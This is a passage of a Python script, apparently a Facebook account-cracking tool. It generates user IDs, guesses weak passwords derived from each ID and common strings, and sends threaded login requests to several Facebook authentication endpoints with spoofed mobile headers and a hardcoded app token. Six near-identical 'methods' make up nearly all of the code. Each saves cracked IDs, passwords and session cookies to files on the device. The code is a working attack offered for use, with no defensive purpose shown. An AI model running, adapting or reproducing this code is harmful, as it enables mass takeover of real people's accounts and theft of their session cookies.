    mtd = input(">_ SELECT >> ")
    with ThreadPoolExecutor(max_workers=30) as Fucker:
        clear()
        print(f">_ TOTAL UID  >> {str(len(gen))}")
        print(f">_ METHOD NO  >> M->{mtd}")
        print(f">_ USING UA -> {str(uajson[uxg])}")
        print(f">_ USE FLIGHT MODDE FOR OK IDS")
        print(40*"-")
        for xxx in gen:
            ids = code + xxx
            psx = [ids,xxx,ids[:6],ids[:7],ids[:8],xxx[1:],xxx[2:],'77889900','07860786','iloveyou','fuck you']
            if mtd == "1":Fucker.submit(xuding_methodA,ids,psx,uxg)
            elif mtd == "2":Fucker.submit(xuding_methodB,ids,psx,uxg)
            elif mtd == "3":Fucker.submit(xuding_methodC,ids,psx,uxg)
            elif mtd == "4":Fucker.submit(xuding_methodD,ids,psx,uxg)
            elif mtd == "5":Fucker.submit(xuding_methodE,ids,psx,uxg)
            elif mtd == "6":Fucker.submit(xuding_methodF,ids,psx,uxg)
            else:Fucker.submit(xuding_methodA,ids,psx,uxg)
    __import__('sys').exit(40*"\x1b[97m-")

def xuding_methodA(ids,psx,uxg):
    global loop,oks,cps
    __import__('sys').stdout.write(f"\r\x1b[m>_ : {ids}|M1|{loop}|•|\x1b[38;5;46m{len(oks)}\x1b[97m|\x1b[38;5;196m{len(cps)}\r")
    __import__('sys').stdout.flush()
    try:
        if uxg == "1":samsung()
        elif uxg == "2":xiaomi()
        elif uxg == "3":realme()
        elif uxg == "4":oppo()
        elif uxg == "5":vivo()
        elif uxg == "6":sony()
        elif uxg == "7":huawei()
        elif uxg == "8":motorola()
        elif uxg == "9":htc()
        elif uxg == "10":itel()
        elif uxg == "11":infinix()
        elif uxg == "12":techno()
        else:samsung()
        for pas in psx:
            adid = str(__import__('uuid').uuid4())
            with __import__('requests').Session() as session:
                data={
                "email":ids,
                "password": pas,
                "method": "post",
                "pretty": "false",
                "format": "json",
                "server_timestamps": "true",
                "locale": "en_US",
                "purpose": "fetch",
                "fb_api_req_friendly_name": "FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.headers_process_transparency_event",
                "fb_api_caller_class": "graphservice",
                "client_doc_id": str(__import__('random').randint(111111111111111111111111111111,999999999999999999999999999999)),
                "lois_settings": "lois_token",
                "lara_override": "server_params",
                "is_from_logged_out": "0",
                "layered_homepage_experiment_group": "null",
                "device_id": adid,
                "waterfall_id": adid,
                "INTERNAL__latency_qpl_instance_id": "71821365400215",
                "is_platform_login": "0",
                "header_transparency_event_location": "login",
                "INTERNAL__latency_qpl_marker_id": str(__import__('random').randint(11111111,99999999)),
                "family_device_id": adid,
                "offline_experiment_group": "caa_iteration_v6_perf_fb_2",
                "INTERNAL_INFRA_THEME": "harm_f",
                "headers_flow_id": adid,
                "transparency_event_type": "affirmative_action",
                "header_transparency_event_name": "login_button_clicked",
                "is_from_logged_in_switcher": "0",
                "bloks_versioning_id": "c3cc18230235472b54176a5922f9b91d291342c3a276e2644dbdb9760b96deec",
                "app_id": "com.bloks.www.bloks.caa.login.async.headers_process_transparency_event",
                "scale": "2",
                "styles_id": "e6c6f61b7a86cdf3fa2eaaffa982fbd1",
                "using_white_navbar": "True",
                "pixel_ratio": "2",
                "is_push_on": "True",
                "bloks_version": "c3cc18230235472b54176a5922f9b91d291342c3a276e2644dbdb9760b96deec",
                "fb_api_analytics_tags": '["GraphServices"]',
                "client_trace_id": adid,
                "generate_session_cookies": "1",
                "generate_analytics_claim": "1",
                "error_detail_type": "button_with_disabled"}
                headers = {
                "x-fb-request-analytics-tags": '{"network_tags":{"product":"350685531728","purpose":"fetch","request_category":"graphql","retry_attempt":"0"},"application_tags":"graphservice"}', 
                "x-fb-ta-logging-ids": f"graphql:{adid}",
                "content-type": "application/x-www-form-urlencoded",
                "x-fb-connection-type": "WIFI",
                "x-fb-background-state": "1",
                "x-graphql-request-purpose": "fetch",
                "user-agent": useragent_control(),
                "authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                "x-fb-friendly-name": "FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.headers_process_transparency_event",
                "x-graphql-client-library": "graphservice",
                "x-fb-privacy-context": "3643298472347298",
                "x-fb-device-group": "3273",
                "x-tigon-is-retry": "False",
                "priority": "u=3,i",
                "accept-encoding": "gzip, deflate",
                "x-fb-http-engine": "Liger",
                "x-fb-client-ip": "True",
                "x-fb-server-cluster": "True"}
                q = session.post("https://graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    uid=str(q['uid'])
                    coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                    print(f"\r\x1b[m>_ : OK >> \x1b[38;5;46m{uid} • {pas}")
                    open('/sdcard/AIMAN-M1-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                    oks.append(uid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    open('/sdcard/AIMAN-M1-RNDM-CP.txt','a').write(ids+'|'+pas+'\n')
                    cps.append(ids)
                    break
                else:continue
        loop+=1
    except Exception as e:
        pass

def xuding_methodB(ids,psx,uxg):
    global loop,oks,cps
    __import__('sys').stdout.write(f"\r\x1b[m>_ : {ids}|M2|{loop}|•|\x1b[38;5;46m{len(oks)}\x1b[97m|\x1b[38;5;196m{len(cps)}\r")
    __import__('sys').stdout.flush()
    try:
        if uxg == "1":samsung()
        elif uxg == "2":xiaomi()
        elif uxg == "3":realme()
        elif uxg == "4":oppo()
        elif uxg == "5":vivo()
        elif uxg == "6":sony()
        elif uxg == "7":huawei()
        elif uxg == "8":motorola()
        elif uxg == "9":htc()
        elif uxg == "10":itel()
        elif uxg == "11":infinix()
        elif uxg == "12":techno()
        else:samsung()
        for pas in psx:
            adid = str(__import__('uuid').uuid4())
            with __import__('requests').Session() as session:
                data={
                "email":ids,
                "password": pas,
                "method": "post",
                "pretty": "false",
                "format": "json",
                "server_timestamps": "true",
                "locale": "en_US",
                "purpose": "fetch",
                "fb_api_req_friendly_name": "FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.headers_process_transparency_event",
                "fb_api_caller_class": "graphservice",
                "client_doc_id": str(__import__('random').randint(111111111111111111111111111111,999999999999999999999999999999)),
                "lois_settings": "lois_token",
                "lara_override": "server_params",
                "is_from_logged_out": "0",
                "layered_homepage_experiment_group": "null",
                "device_id": adid,
                "waterfall_id": adid,
                "INTERNAL__latency_qpl_instance_id": "71821365400215",
                "is_platform_login": "0",
                "header_transparency_event_location": "login",
                "INTERNAL__latency_qpl_marker_id": str(__import__('random').randint(11111111,99999999)),
                "family_device_id": adid,
                "offline_experiment_group": "caa_iteration_v6_perf_fb_2",
                "INTERNAL_INFRA_THEME": "harm_f",
                "headers_flow_id": adid,
                "transparency_event_type": "affirmative_action",
                "header_transparency_event_name": "login_button_clicked",
                "is_from_logged_in_switcher": "0",
                "bloks_versioning_id": "c3cc18230235472b54176a5922f9b91d291342c3a276e2644dbdb9760b96deec",
                "app_id": "com.bloks.www.bloks.caa.login.async.headers_process_transparency_event",
                "scale": "2",
                "styles_id": "e6c6f61b7a86cdf3fa2eaaffa982fbd1",
                "using_white_navbar": "True",
                "pixel_ratio": "2",
                "is_push_on": "True",
                "bloks_version": "c3cc18230235472b54176a5922f9b91d291342c3a276e2644dbdb9760b96deec",
                "fb_api_analytics_tags": '["GraphServices"]',
                "client_trace_id": adid,
                "generate_session_cookies": "1",
                "generate_analytics_claim": "1",
                "error_detail_type": "button_with_disabled"}
                headers = {
                "x-fb-request-analytics-tags": '{"network_tags":{"product":"350685531728","purpose":"fetch","request_category":"graphql","retry_attempt":"0"},"application_tags":"graphservice"}', 
                "x-fb-ta-logging-ids": f"graphql:{adid}",
                "content-type": "application/x-www-form-urlencoded",
                "x-fb-connection-type": "WIFI",
                "x-fb-background-state": "1",
                "x-graphql-request-purpose": "fetch",
                "user-agent": useragent_control(),
                "authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                "x-fb-friendly-name": "FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.headers_process_transparency_event",
                "x-graphql-client-library": "graphservice",
                "x-fb-privacy-context": "3643298472347298",
                "x-fb-device-group": "3273",
                "x-tigon-is-retry": "False",
                "priority": "u=3,i",
                "accept-encoding": "gzip, deflate",
                "x-fb-http-engine": "Liger",
                "x-fb-client-ip": "True",
                "x-fb-server-cluster": "True"}
                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    uid=str(q['uid'])
                    coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                    print(f"\r\x1b[m>_ : OK >> \x1b[38;5;46m{uid} • {pas}")
                    open('/sdcard/AIMAN-M2-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                    oks.append(uid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    open('/sdcard/AIMAN-M2-RNDM-CP.txt','a').write(ids+'|'+pas+'\n')
                    cps.append(ids)
                    break
                else:continue
        loop+=1
    except Exception as e:
        pass

def xuding_methodC(ids,psx,uxg):
    global loop,oks,cps
    __import__('sys').stdout.write(f"\r\x1b[m>_ : {ids}|M3|{loop}|•|\x1b[38;5;46m{len(oks)}\x1b[97m|\x1b[38;5;196m{len(cps)}\r")
    __import__('sys').stdout.flush()
    try:
        if uxg == "1":samsung()
        elif uxg == "2":xiaomi()
        elif uxg == "3":realme()
        elif uxg == "4":oppo()
        elif uxg == "5":vivo()
        elif uxg == "6":sony()
        elif uxg == "7":huawei()
        elif uxg == "8":motorola()
        elif uxg == "9":htc()
        elif uxg == "10":itel()
        elif uxg == "11":infinix()
        elif uxg == "12":techno()
        else:samsung()
        for pas in psx:
            adid = str(__import__('uuid').uuid4())
            with __import__('requests').Session() as session:
                data = {'adid': adid,'format': 'json','device_id': adid,'email': ids, 'password': pas, 'generate_analytics_claims': '1','community_id': '', 'cpl': 'true', 'try_num': '1','family_device_id': adid,'credentials_type': 'password','source': 'login','error_detail_type': 'button_with_disabled','enroll_misauth': 'false', 'generate_session_cookies': '1','generate_machine_id': '1', 'currently_logged_in_userid': '0','locale': 'en_US', 'client_country_code': 'US', 'fb_api_req_friendly_name': 'authenticate'}
                head = {
                'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'X-FB-Friendly-Name': 'authenticate',
                'X-FB-Connection-Bandwidth': str(__import__('random').randint(20000, 40000)),
                'X-FB-Net-HNI': str(__import__('random').randint(20000, 40000)),
                'X-FB-SIM-HNI': str(__import__('random').randint(20000, 40000)),
                'X-FB-Connection-Type': 'unknown',
                'User-Agent': uxg,
                'Accept-Encoding': 'gzip, deflate',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-FB-HTTP-Engine': 'Liger'}
                q = session.post('https://api.facebook.com/method/auth.login',data=data,headers=head).json()
                if 'session_key' in q:
                    uid=str(q['uid'])
                    coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                    print(f"\r\x1b[m>_ : OK >> \x1b[38;5;46m{uid} • {pas}")
                    open('/sdcard/AIMAN-M3-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                    oks.append(uid)
                    break
                elif 'www.facebook.com' in q['error_msg']:
                    open('/sdcard/AIMAN-M3-RNDM-CP.txt','a').write(ids+'|'+pas+'\n')
                    cps.append(ids)
                    break
                else:continue
        loop+=1
    except Exception as e:
        pass
                
def xuding_methodD(ids,psx,uxg):
    global loop,oks,cps
    __import__('sys').stdout.write(f"\r\x1b[m>_ : {ids}|M4|{loop}|•|\x1b[38;5;46m{len(oks)}\x1b[97m|\x1b[38;5;196m{len(cps)}\r")
    __import__('sys').stdout.flush()
    try:
        if uxg == "1":samsung()
        elif uxg == "2":xiaomi()
        elif uxg == "3":realme()
        elif uxg == "4":oppo()
        elif uxg == "5":vivo()
        elif uxg == "6":sony()
        elif uxg == "7":huawei()
        elif uxg == "8":motorola()
        elif uxg == "9":htc()
        elif uxg == "10":itel()
        elif uxg == "11":infinix()
        elif uxg == "12":techno()
        else:samsung()
        for pas in psx:
            adid = str(__import__('uuid').uuid4())
            with __import__('requests').Session() as session:
                data = {
                "adid": adid,
                "format": "json",
                "device_id": adid,
                "cpl": "true",
                "family_device_id": adid,
                "credentials_type": "device_based_login_password",
                "error_detail_type": "button_with_disabled",
                "source": "device_based_login",
                "email": ids,
                "password": pas,
                "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                "generate_session_cookies": "1",
                "meta_inf_fbmeta": "",
                "advertiser_id": adid,
                "currently_logged_in_userid": "0",
                "locale": "en_US",
                "client_country_code": "US",
                "method": "auth.login",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "api_key": "882a8490361da98702bf97a021ddc14d"}
                head = {
                "User-Agent": uxg,
                "Content-Type": "application/x-www-form-urlencoded",
                "Host": "graph.facebook.com",
                "X-FB-Net-HNI": str(__import__('random').randint(20000, 40000)),
                "X-FB-SIM-HNI": str(__import__('random').randint(20000, 40000)),
                "X-FB-Connection-Type": "MOBILE.LTE",
                "X-Tigon-Is-Retry": "False",
                "x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62",
                "x-fb-device-group": "5120",
                "X-FB-Friendly-Name": "ViewerReactionsMutation",
                "X-FB-Request-Analytics-Tags": "graphservice",
                "X-FB-HTTP-Engine": "Liger",
                "X-FB-Client-IP": "True",
                "X-FB-Server-Cluster": "True",
                "x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62",}
                q = session.post('https://b-api.facebook.com/auth/login',data=data,headers=head).json()
                if 'session_key' in q:
                    uid=str(q['uid'])
                    coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                    print(f"\r\x1b[m>_ : OK >> \x1b[38;5;46m{uid} • {pas}")
                    open('/sdcard/AIMAN-M4-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                    oks.append(uid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    open('/sdcard/AIMAN-M4-RNDM-CP.txt','a').write(ids+'|'+pas+'\n')
                    cps.append(ids)
                    break
                else:continue
        loop+=1
    except Exception as e:
        pass

def xuding_methodE(ids,psx,uxg):
    global loop,oks,cps
    __import__('sys').stdout.write(f"\r\x1b[m>_ : {ids}|M5|{loop}|•|\x1b[38;5;46m{len(oks)}\x1b[97m|\x1b[38;5;196m{len(cps)}\r")
    __import__('sys').stdout.flush()
    try:
        if uxg == "1":samsung()
        elif uxg == "2":xiaomi()
        elif uxg == "3":realme()
        elif uxg == "4":oppo()
        elif uxg == "5":vivo()
        elif uxg == "6":sony()
        elif uxg == "7":huawei()
        elif uxg == "8":motorola()
        elif uxg == "9":htc()
        elif uxg == "10":itel()
        elif uxg == "11":infinix()
        elif uxg == "12":techno()
        else:samsung()
        for pas in psx:
            adid = str(__import__('uuid').uuid4())
            with __import__('requests').Session() as session:
                data = {
                "email":ids,
                "password":pas,
                "adid": adid,
                "device_id": adid,
                "family_device_id": adid,
                "session_id": adid,
                "advertiser_id": adid,
                "reg_instance": adid,
                "logged_out_id": adid,
                "locale": "en_US",
                "client_country_code": "US",
                "cpl": "true",
                "source": "login",
                "format": "json",
                "omit_response_on_success": "false",
                "credentials_type": "password",
                "error_detail_type": "button_with_disabled",
                "generate_session_cookies": "1",
                "generate_analytics_claim": "1",
                "generate_machine_id": "1",
                "tier": "regular",
                "currently_logged_in_userid" : "0",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "fb4a_shared_phone_cpl_experiment": "fb4a_shared_phone_nonce_cpl_at_risk_v3",
                "fb4a_shared_phone_cpl_group": "enable_v3_at_risk",
                "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32", # --> Use App ID|Token/Sig
                "api_key": "882a8490361da98702bf97a021ddc14d",
                "sig":"62f8ce9f74b12f84c123cc23437a4a32"}
            content_lenght = ("&").join([ "%s=%s" % (key, value) for key, value in data.items()])
            head = {
            "User-Agent": uxg,
            "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32", # --> Use App ID|Token/Sig
            "X-FB-SIM-HNI": str(__import__('random').randint(20000, 40000)),
            "X-FB-Net-HNI": str(__import__('random').randint(20000, 40000)),
            "X-FB-Connection-Bandwidth": str(__import__('random').randint(20000000, 30000000)),
            "X-FB-Connection-Quality": "EXCELLENT",
            "X-FB-Connection-Type": "MOBILE.LTE",
            "X-FB-HTTP-Engine": "Liger",
            'X-FB-Client-IP': 'True',
            "X-FB-Friendly-Name": "authenticate",
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": str(len(content_lenght))}
            url = "https://graph.facebook.com/auth/login"
            q = session.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
            if 'session_key' in q:
                uid=str(q['uid'])
                coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                print(f"\r\x1b[m>_ : OK >> \x1b[38;5;46m{uid} • {pas}")
                open('/sdcard/AIMAN-M5-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                oks.append(uid)
                break
            elif 'www.facebook.com' in q['error']['message']:
                open('/sdcard/AIMAN-M5-RNDM-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
    except Exception as e:
        pass

def xuding_methodF(ids,psx,uxg):
    global loop,oks,cps
    __import__('sys').stdout.write(f"\r\x1b[m>_ : {ids}|M6|{loop}|•|\x1b[38;5;46m{len(oks)}\x1b[97m|\x1b[38;5;196m{len(cps)}\r")
    __import__('sys').stdout.flush()
    try:
        if uxg == "1":samsung()
        elif uxg == "2":xiaomi()
        elif uxg == "3":realme()
        elif uxg == "4":oppo()
        elif uxg == "5":vivo()
        elif uxg == "6":sony()
        elif uxg == "7":huawei()
        elif uxg == "8":motorola()
        elif uxg == "9":htc()
        elif uxg == "10":itel()
        elif uxg == "11":infinix()
        elif uxg == "12":techno()
        else:samsung()
        for pas in psx:
            adid = str(__import__('uuid').uuid4())
            with __import__('requests').Session() as session:
                data = {
                "email":ids,
                "password":pas,
                "adid": adid,
                "device_id": adid,
                "family_device_id": adid,
                "session_id": adid,
                "advertiser_id": adid,
                "reg_instance": adid,
                "logged_out_id": adid,
                "locale": "en_US",
                "client_country_code": "US",
                "cpl": "true",
                "source": "login",
                "format": "json",
                "omit_response_on_success": "false",
                "credentials_type": "password",
                "error_detail_type": "button_with_disabled",
                "generate_session_cookies": "1",
                "generate_analytics_claim": "1",
                "generate_machine_id": "1",
                "tier": "regular",
                "currently_logged_in_userid" : "0",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "fb4a_shared_phone_cpl_experiment": "fb4a_shared_phone_nonce_cpl_at_risk_v3",
                "fb4a_shared_phone_cpl_group": "enable_v3_at_risk",
                "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32", # --> Use App ID|Token/Sig
                "api_key": "882a8490361da98702bf97a021ddc14d",
                "sig":"62f8ce9f74b12f84c123cc23437a4a32"}
            content_lenght = ("&").join([ "%s=%s" % (key, value) for key, value in data.items()])
            head = {
            "User-Agent": uxg,
            "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32", # --> Use App ID|Token/Sig
            "X-FB-SIM-HNI": str(__import__('random').randint(20000, 40000)),
            "X-FB-Net-HNI": str(__import__('random').randint(20000, 40000)),
            "X-FB-Connection-Bandwidth": str(__import__('random').randint(20000000, 30000000)),
            "X-FB-Connection-Quality": "EXCELLENT",
            "X-FB-Connection-Type": "MOBILE.LTE",
            "X-FB-HTTP-Engine": "Liger",
            'X-FB-Client-IP': 'True',
            "X-FB-Friendly-Name": "authenticate",
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": str(len(content_lenght))}
            url = "https://b-graph.facebook.com/auth/login"
            q = session.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
            if 'session_key' in q:
                uid=str(q['uid'])
                coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                print(f"\r\x1b[m>_ : OK >> \x1b[38;5;46m{uid} • {pas}")
                open('/sdcard/AIMAN-M6-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                oks.append(uid)
                break
            elif 'www.facebook.com' in q['error']['message']:
                open('/sdcard/AIMAN-M6-RNDM-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
    except Exception as e:
        pass

if __name__ == "__main__":
    main()
